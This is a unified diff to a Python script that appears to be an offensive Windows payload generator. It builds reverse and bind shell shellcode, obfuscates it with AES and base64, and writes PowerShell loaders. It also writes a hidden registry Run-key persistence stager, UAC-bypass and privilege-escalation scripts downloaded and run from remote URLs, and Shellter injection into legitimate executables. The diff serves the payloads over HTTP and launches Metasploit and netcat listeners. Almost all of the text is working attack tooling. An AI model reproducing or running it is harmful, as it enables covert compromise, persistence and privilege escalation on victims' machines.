@@ -14,8 +14,12 @@ from Crypto.Cipher import AES
 import base64
 import string
 import re
+import glob
+import readline
+
 
 t = blessings.Terminal()
+
 try:
     iperror = False
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -26,10 +30,13 @@ except:
 
 
 def ServePayload(payloaddirectory):
-    os.chdir(payloaddirectory)
-    Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
-    httpd = SocketServer.TCPServer(('', 8000), Handler)
-    httpd.serve_forever()
+    try:
+        os.chdir(payloaddirectory)
+        Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
+        httpd = SocketServer.TCPServer(('', 8000), Handler)
+        httpd.serve_forever()
+    except:
+        print t.bold_red + '\n[*] WebServer Shutdown' + t.normal
 
 
 def PyCipher(filecontents):  # Adaptation of PyHerion 1.0 By: @harmj0y
@@ -57,7 +64,7 @@ def PyCipher(filecontents):  # Adaptation of PyHerion 1.0 By: @harmj0y
 
     input = filecontents.split('\n')
 
-    newoutput,newoutputt = '',''
+    newoutput, newoutputt = '', ''
 
     for line in input:
         if not line.startswith("#"):
@@ -70,7 +77,6 @@ def PyCipher(filecontents):  # Adaptation of PyHerion 1.0 By: @harmj0y
 
     encrypted = EncodeAES(cipherEnc, "\n".join(output))
 
-
     b64var, aesvar = randVar(), randVar()
 
     imports.append("from base64 import b64decode as %s" % (b64var))
@@ -80,7 +86,8 @@ def PyCipher(filecontents):  # Adaptation of PyHerion 1.0 By: @harmj0y
 
     newoutput = ";".join(imports) + "\n"
 
-    newoutput += "exec(%s(\"%s\"))" % (b64var, base64.b64encode("exec(%s.new(\"%s\").decrypt(%s(\"%s\")).rstrip('{'))\n" % (aesvar, key, b64var, encrypted)))
+    newoutput += "exec(%s(\"%s\"))" % (b64var, base64.b64encode(
+        "exec(%s.new(\"%s\").decrypt(%s(\"%s\")).rstrip('{'))\n" % (aesvar, key, b64var, encrypted)))
     return newoutput
 
 windows_rev_shell = (
@@ -160,7 +167,7 @@ windows_met_bind_shell = (
     "\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f"
     "\xff\xd5\x83\xf8\x00\x7e\x07\x01\xc3\x29\xc6\x75\xe9\xc3")
 
-payload, payloadchoice, payloaddir, ez2read_shellcode, nullbytecount = '', '', '/etc/winpayloads', '', 0
+payload, payloadchoice, payloaddir, ez2read_shellcode, nullbytecount, ez2read_shellcode2, want_UACBYPASS, want_ALLCHECKS = '', '', '/etc/winpayloads', '', 0, '', 'n', 'n'
 try:
     os.mkdir(payloaddir)
 except OSError:
@@ -177,11 +184,11 @@ print "   /____/".center(t.width)
 print t.normal + '=' * t.width
 
 try:
-    print '[1] Windows Stageless Reverse Shell'.center(t.width) + '[2] Windows Meterpreter Reverse Shell(staged)'.center(t.width) + '[3] Windows Meterpreter Bind Shell(staged)'.center(t.width) + '[4] Windows Meterpreter Reverse Shell(Raw)'.center(t.width)+ '[5] Windows Meterpreter Reverse Shell(Persistence)'.center(t.width)
+    print '[1] Windows Stageless Reverse Shell'.center(t.width) + t.bold_red + '[Shellter]'.center(t.width) + t.normal + '[2] Windows Meterpreter Reverse Shell(staged)'.center(t.width) + t.bold_red + '[Shellter, UacBypass, Priv Esc Checks]'.center(t.width) + t.normal + '[3] Windows Meterpreter Bind Shell(staged)'.center(t.width) + t.bold_red + ' [Shellter, UacBypass, Priv Esc Checks]'.center(t.width) + t.normal + '[4] Windows Meterpreter Reverse Shell(Raw)'.center(t.width) + t.bold_red + '[Base64 Encode]'.center(t.width) + t.normal + '[5] Windows Meterpreter Reverse Shell(Persistence)'.center(t.width) + t.bold_red + '[Shellter]'.center(t.width) + t.normal
     print '=' * t.width
     menuchoice = raw_input('> ')
     if menuchoice == '1':
-        payloadchoice = windows_rev_shelll
+        payloadchoice = windows_rev_shell
         payload = 'Windows Reverse Shell'
     elif menuchoice == '2':
         payloadchoice = windows_met_rev_shell
@@ -206,13 +213,13 @@ try:
             '\n[*] Press Enter For Default Port(4444)\n[*] Port> ')
         if iperror == False:
             ipaddr = raw_input(
-            '\n[*] Press Enter To Get Local Ip Automatically\n[*] IP> ')
+                '\n[*] Press Enter To Get Local Ip Automatically\n[*] IP> ')
             if len(ipaddr) is 0:
                 ipaddr = IP
         else:
             print t.bold_red + 'Error Getting Ip Automatically'
             ipaddr = raw_input(
-            '\n[*] Press Enter Your IP Manually(Automatic Disabled)\n[*] IP> ')
+                '\n[*] Press Enter Your IP Manually(Automatic Disabled)\n[*] IP> ')
 
         if len(portnum) is 0:
             portnum = 4444
@@ -220,28 +227,28 @@ try:
         ip1, ip2, ip3, ip4 = ipaddr.split('.')
         iphex = struct.pack('BBBB', int(ip1), int(ip2), int(ip3), int(ip4))
         porthex = struct.pack('>h', int(portnum))
+        porthex2 = struct.pack('>h', int(portnum + 1))
         shellcode = payloadchoice % (iphex, porthex)
+        shellcode2 = payloadchoice % (iphex, porthex2)
     elif menuchoice == '3':
         bindport = raw_input(
             '\n[*] Press Enter For Default Bind Port(4444)\n[*] Port> ')
         if len(bindport) is 0:
             bindport = 4444
         bindporthex = struct.pack('>h', int(bindport))
+        bindporthex2 = struct.pack('>h', int(bindport + 1))
         shellcode = payloadchoice % (bindporthex)
+        shellcode2 = payloadchoice % (bindporthex2)
+
+    if menuchoice == '2' or menuchoice == '3':
+        want_UACBYPASS = raw_input(
+            t.bold_red + '[*] Try UAC Bypass(Only Works For Local Admin Account)? y/[n]:' + t.normal)
+        if want_UACBYPASS.lower() == 'n' or want_UACBYPASS.lower() == '':
+            want_ALLCHECKS = raw_input(
+                t.bold_red + '[*] Invoke Priv Esc Checks? y/[n]:' + t.normal)
 
     for byte in shellcode:
         ez2read_shellcode += '\\x%s' % byte.encode('hex')
-
-    if menuchoice == '4':
-        raw_b64encode = raw_input('[*] Base64 Encode Raw Payload? y/[n]: ')
-        if raw_b64encode.lower() == 'y':
-            print '=' * int((t.width / 2)-5) + 'SHELLCODE' + '=' * int((t.width / 2)-4) + '\n' + base64.b64encode(shellcode) + '\n' + '=' * t.width
-            sys.exit()
-        elif raw_b64encode.lower() == 'n' or raw_b64encode == '':
-            print ez2read_shellcode
-            sys.exit()
-
-    if menuchoice == '5':
         count = 0
         newpayloadlayout = ''
         for char in ez2read_shellcode:
@@ -250,18 +257,46 @@ try:
             if count == 4:
                 newpayloadlayout += ','
                 count = 0
-        persistencelayout = re.sub(r'\\x','0x',newpayloadlayout).rstrip(',')
-        persistence = """Start-Sleep -m 1;$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-enc ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}""" % (persistencelayout)
-        persistencerc = """run post/windows/manage/smart_migrate\nrun post/windows/manage/powershell/exec_powershell SCRIPT=persist.ps1 SESSION=1"""
-        with open('persist.ps1','w') as persistfile:
-            persistfile.write('New-ItemProperty -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater -PropertyType String -Value "`"$($Env:SystemRoot)\System32\WindowsPowerShell\\v1.0\powershell.exe`\" -exec bypass -NonInteractive -WindowStyle Hidden -enc ' + base64.b64encode(persistence.encode('utf_16_le')) + '\"')
+
+    if want_UACBYPASS.lower() == 'y':
+        for byte in shellcode2:
+            ez2read_shellcode2 += '\\x%s' % byte.encode('hex')
+            count = 0
+            newpayloadlayout = ''
+            for char in ez2read_shellcode2:
+                count += 1
+                newpayloadlayout += char
+                if count == 4:
+                    newpayloadlayout += ','
+                    count = 0
+    if menuchoice == '4':
+        raw_b64encode = raw_input(
+            t.bold_red + '[*] Base64 Encode Raw Payload? y/[n]: ' + t.normal)
+        if raw_b64encode.lower() == 'y':
+            print '=' * int((t.width / 2) - 5) + 'SHELLCODE' + '=' * int((t.width / 2) - 4) + '\n' + base64.b64encode(ez2read_shellcode) + '\n' + '=' * t.width
+            sys.exit()
+        else:
+            print ez2read_shellcode
+            sys.exit()
+
+    persistencelayout = re.sub(r'\\x', '0x', newpayloadlayout).rstrip(',')
+    persistencesleep = """Start-Sleep -s 60;$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-enc ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}""" % (
+        persistencelayout)
+    persistencenosleep = """$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = %s;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));$2 = "-enc ";if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + "\syswow64\WindowsPowerShell\\v1.0\powershell";iex "& $3 $2 $e"}else{;iex "& powershell $2 $e";}""" % (
+        persistencelayout)
+    persistencerc = """run post/windows/manage/smart_migrate\nrun post/windows/manage/exec_powershell SCRIPT=persist.ps1 SESSION=1"""
+
+    if menuchoice == '5':
+        with open('persist.ps1', 'w') as persistfile:
+            persistfile.write('New-ItemProperty -Force -Path HKCU:Software\Microsoft\Windows\CurrentVersion\Run\ -Name Updater -PropertyType String -Value "`"$($Env:SystemRoot)\System32\WindowsPowerShell\\v1.0\powershell.exe`\" -exec bypass -NonInteractive -WindowStyle Hidden -enc ' +
+                              base64.b64encode(persistencesleep.encode('utf_16_le')) + '\"')
             persistfile.close()
-        with open('persist.rc','w') as persistfilerc:
+        with open('persist.rc', 'w') as persistfilerc:
             persistfilerc.write(persistencerc)
             persistfilerc.close()
 
     want_to_payloadinexe = raw_input(
-        '[*] Inject Shellcode Into an EXE (Shellter)? y/[n]: ')
+        t.bold_red + '[*] Inject Shellcode Into an EXE (Shellter)? y/[n]: ' + t.normal)
 
     injectwindows = """#/usr/bin/python
 import ctypes
@@ -272,11 +307,33 @@ buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
 ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),buf,ctypes.c_int(len(shellcode)))
 ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
 ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
-""" % ez2read_shellcode
+"""
+
+    if menuchoice == '2' or menuchoice == '3':
+        if want_UACBYPASS.lower() == 'y':
+            uacbypassrcfilecontents = """run post/windows/manage/migrate SESSION=1 NAME=explorer.exe SPAWN=false KILL=false\nrun post/windows/manage/exec_powershell SCRIPT=bypassuac.ps1 SESSION=1"""
+            uacbypassrcfilecontents2 = """run post/windows/manage/migrate SESSION=2 NAME=spoolsv.exe SPAWN=false KILL=false\nrun post/windows/escalate/getsystem SESSION=2"""
+            uacbypassfilecontent = """IEX (New-Object Net.WebClient).DownloadString("https://github.com/PowerShellEmpire/Empire/raw/master/data/module_source/privesc/Invoke-BypassUAC.ps1");\nInvoke-BypassUAC -Command \"powershell -enc %s\" """ % (
+                base64.b64encode(persistencenosleep.encode('utf_16_le')))
+            with open('bypassuac.ps1', 'w') as uacbypassfile:
+                uacbypassfile.write(uacbypassfilecontent)
+                uacbypassfile.close()
+            with open('uacbypass.rc', 'w') as uacbypassfilerc:
+                uacbypassfilerc.write(uacbypassrcfilecontents)
+                uacbypassfilerc.close()
+            with open('uacbypass2.rc', 'w') as uacbypassfilerc2:
+                uacbypassfilerc2.write(uacbypassrcfilecontents2)
+                uacbypassfilerc2.close()
+
+    if want_ALLCHECKS.lower() == 'y':
+        with open('allchecks.ps1', 'w') as allchecksfile:
+            allchecksfile.write(
+                """IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1");invoke-allchecks""")
+            allchecksfile.close()
 
     if not want_to_payloadinexe == 'y':
         with open('%s/payload.py' % payloaddir, 'w+') as Filesave:
-            Filesave.write(PyCipher(injectwindows))
+            Filesave.write(PyCipher(injectwindows % (ez2read_shellcode)))
             Filesave.close()
 
         print '[*] Creating Payload.exe From Payload.py...'
@@ -290,7 +347,7 @@ ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
         os.system('rm %s/dist -r' % payloaddir)
         os.system('rm %s/build -r' % payloaddir)
         os.system('rm %s/*.spec' % payloaddir)
-        # os.system('rm %s/payload.py' % payloaddir)
+        os.system('rm %s/payload.py' % payloaddir)
         print '\n[*] Payload.exe Has Been Generated And Is Located Here: ' + t.bold_green + '%s/payload.exe' % payloaddir + t.normal
 
     if want_to_payloadinexe.lower() == 'y':
@@ -304,34 +361,54 @@ ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
         with open('payloadbin', 'wb') as Csave:
             Csave.write(shellcode)
             Csave.close()
-        if re.search('http',payloadinexe_payloadname):
-            os.system('wget %s'%payloadinexe_payloadname)
-            payloadinexe_payloadname = re.search('(\w*.exe)',payloadinexe_payloadname)
+        if re.search('http', payloadinexe_payloadname):
+            os.system('wget %s' % payloadinexe_payloadname)
+            payloadinexe_payloadname = re.search(
+                '(\w*.exe)', payloadinexe_payloadname)
             payloadinexe_payloadname = payloadinexe_payloadname.group(1)
-        os.system('wine shellter.exe -a -f %s -s -p payloadbin '% payloadinexe_payloadname)
-        os.system('mv %s ./compiled/%s'%(payloadinexe_payloadname,payloadinexe_payloadname))
+        os.system('wine shellter.exe -a -f %s -s -p payloadbin ' %
+                  payloadinexe_payloadname)
+        os.system('mv %s ./compiled/%s' %
+                  (payloadinexe_payloadname, payloadinexe_payloadname))
 
     want_to_upload = raw_input(
         '\n[*] Upload To Local Websever? [y]/n: ')
     if want_to_upload.lower() == 'y' or want_to_upload == '':
         if want_to_payloadinexe == 'y':
-            print t.bold_green + "\n[*] Serving Payload On http://%s:8000/%s" % (IP,payloadinexe_payloadname) + t.normal
-            t = multiprocessing.Process(target=ServePayload, args = (os.getcwd() + '/compiled',))
-            t.start()
+            print t.bold_green + "\n[*] Serving Payload On http://%s:8000/%s" % (IP, payloadinexe_payloadname) + t.normal
+            a = multiprocessing.Process(
+                target=ServePayload, args=(os.getcwd() + '/compiled',))
+            a.daemon = True
+            a.start()
         else:
             print t.bold_green + "\n[*] Serving Payload On http://%s:8000/payload.exe" % (IP) + t.normal
-            t = multiprocessing.Process(target=ServePayload, args = (payloaddir,))
-            t.start()
+            a = multiprocessing.Process(
+                target=ServePayload, args=(payloaddir,))
+            a.daemon = True
+            a.start()
 
     if menuchoice == '1':
         os.system('nc -lvp %s' % portnum)
     elif menuchoice == '2':
-        os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set autorunscript post/windows/manage/smart_migrate;set ExitOnSession false;exploit -j\'' % portnum)
+        if want_UACBYPASS.lower() == 'y':
+            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set autorunscript multi_console_command -rc uacbypass.rc;set ExitOnSession false;exploit -j;set LPORT %s;set autorunscript multi_console_command -rc uacbypass2.rc;exploit -j\'' % (portnum, portnum + 1))
+        elif want_ALLCHECKS.lower() == 'y':
+            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set autorunscript post/windows/manage/exec_powershell SCRIPT=allchecks.ps1;set ExitOnSession false;exploit -j\'' % portnum)
+        else:
+            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set autorunscript post/windows/manage/smart_migrate;set ExitOnSession false;exploit -j\'' % portnum)
     elif menuchoice == '3':
         bindip = raw_input(
             '\n[*] Enter Target Ip Address For Metasploit To Connect To The Bind Shell\n[*] IP> ')
-        os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set autorunscript post/windows/manage/smart_migrate;set ExitOnSession false;exploit -j \'' % (bindport, bindip))
+        if want_UACBYPASS.lower() == 'y':
+            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set autorunscript multi_console_command -rc uacbypass.rc;set ExitOnSession false;exploit -j;set LPORT %s;set autorunscript multi_console_command -rc uacbypass2.rc;exploit -j\'' % (bindport, bindip, bindport + 1))
+        else:
+            os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/bind_tcp;set LPORT %s;set RHOST %s;set autorunscript post/windows/manage/smart_migrate;set ExitOnSession false;exploit -j \'' % (bindport, bindip))
     elif menuchoice == '5':
         os.system('msfconsole -x \'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LPORT %s;set LHOST 0.0.0.0;set autorunscript multi_console_command -rc persist.rc;set ExitOnSession false;exploit -j\'' % portnum)
+
+    print t.bold_green + '[*] Cleaning Up\n' + t.normal
+    subprocess.call(['rm *.rc'],shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    subprocess.call(['rm *.ps1'],shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    sys.exit(0)
 except KeyboardInterrupt:
     sys.exit(1)
